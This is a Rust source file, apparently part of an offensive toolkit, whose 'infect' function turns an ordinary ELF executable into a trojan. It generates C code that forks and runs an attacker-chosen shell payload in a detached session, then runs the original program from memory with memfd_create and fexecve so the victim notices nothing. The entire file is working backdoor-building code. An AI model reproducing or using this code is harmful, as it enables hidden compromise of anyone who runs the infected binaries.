use crate::args;
use crate::errors::*;
use std::fmt::Write;
use std::path::Path;
use std::process::Stdio;
use tokio::io::AsyncWriteExt;
use tokio::process::Command;
/*
use crate::shell;
use flate2::bufread::GzDecoder;
use flate2::write::GzEncoder;
use flate2::GzBuilder;
use openssl::hash::MessageDigest;
use openssl::pkey;
use openssl::pkey::PKey;
use openssl::sign::Signer;
use std::io;
use std::io::prelude::*;
use std::io::BufReader;
*/
// use tokio::io::AsyncWrite;

pub fn c_escape(data: &[u8], out: &mut String) -> Result<()> {
    for b in data {
        write!(out, "\\x{:02x}", b)?;
    }
    Ok(())
}

pub async fn infect(args: &args::InfectElf, orig: &[u8], out: &Path) -> Result<()> {
    info!("Spawning C compiler...");
    let mut child = Command::new("gcc")
        .arg("-static")
        .arg("-s")
        .arg("-Os")
        .arg("-o")
        .arg(out)
        .arg("-xc")
        .arg("-")
        .stdin(Stdio::piped())
        .spawn()
        .context("Failed to spawn C compiler")?;

    info!("Generating source code...");
    {
        let mut stdin = child.stdin.take().unwrap();
        let mut buf = String::new();
        c_escape(args.payload.as_bytes(), &mut buf)?;
        for line in &[
            "#define _GNU_SOURCE\n",
            "#include <stdio.h>\n",
            "#include <stdlib.h>\n",
            "#include <unistd.h>\n",
            "#include <sys/mman.h>\n",
            "int main(int argc, char** argv) {\n",
            "pid_t p = fork();\n",
            "if (p) goto bin;\n",
            "setsid();\n",
            &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{}\", NULL}};\n", buf),
            "execve(\"/bin/sh\", args, environ);\n",
            "exit(0);\n",
            "bin:\n",
            "int f = memfd_create(\"\", MFD_CLOEXEC);\n",
        ] {
            debug!("Sending to compiler: {:?}", line);
            stdin.write_all(line.as_bytes()).await?;
        }
        debug!("Passing through binary...");
        for chunk in orig.chunks(2048) {
            buf.clear();
            c_escape(chunk, &mut buf)?;
            stdin.write_all(b"write(f, \"").await?;
            stdin.write_all(buf.as_bytes()).await?;
            stdin
                .write_all(format!("\", {});\n", chunk.len()).as_bytes())
                .await?;
        }
        for line in &["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"] {
            debug!("Sending to compiler: {:?}", line);
            stdin.write_all(line.as_bytes()).await?;
        }
    }

    info!("Waiting for compile to finish...");
    let status = child.wait().await?;
    if !status.success() {
        bail!("Compile failed, compiler exited with {:?}", status);
    }
    info!("Successfully generated binary");

    Ok(())
}
